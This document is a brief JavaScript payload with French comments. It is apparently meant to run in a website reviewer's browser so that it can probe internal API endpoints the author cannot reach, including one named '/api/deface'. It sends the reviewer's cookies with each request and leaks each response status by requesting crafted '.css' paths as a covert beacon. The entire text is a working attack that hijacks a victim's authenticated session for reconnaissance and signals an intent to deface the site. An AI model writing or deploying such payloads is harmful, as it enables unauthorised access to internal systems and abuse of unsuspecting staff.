/* Vantage - sondage de l'API interne depuis le navigateur du reviewer.
   Ses requetes partent de 10.96.6.x, la ou nginx nous refuse en 403. */
(function () {
  function b(t) {
    try { fetch('/account.php/N' + t + '.css', { mode: 'no-cors', cache: 'no-store', keepalive: true }); } catch (e) {}
  }
  b('exec');
  var P = ['/api/', '/api/pages', '/api/page', '/api/content', '/api/publish',
           '/api/home', '/api/v1/', '/api/v1/pages', '/api/index.php',
           '/api/pages.php', '/api/admin', '/api/site', '/api/settings', '/api/deface'];
  P.forEach(function (u, i) {
    fetch(u, { credentials: 'include' })
      .then(function (r) { b('p' + i + 's' + r.status); })
      .catch(function () { b('p' + i + 'err'); });
  });
})();
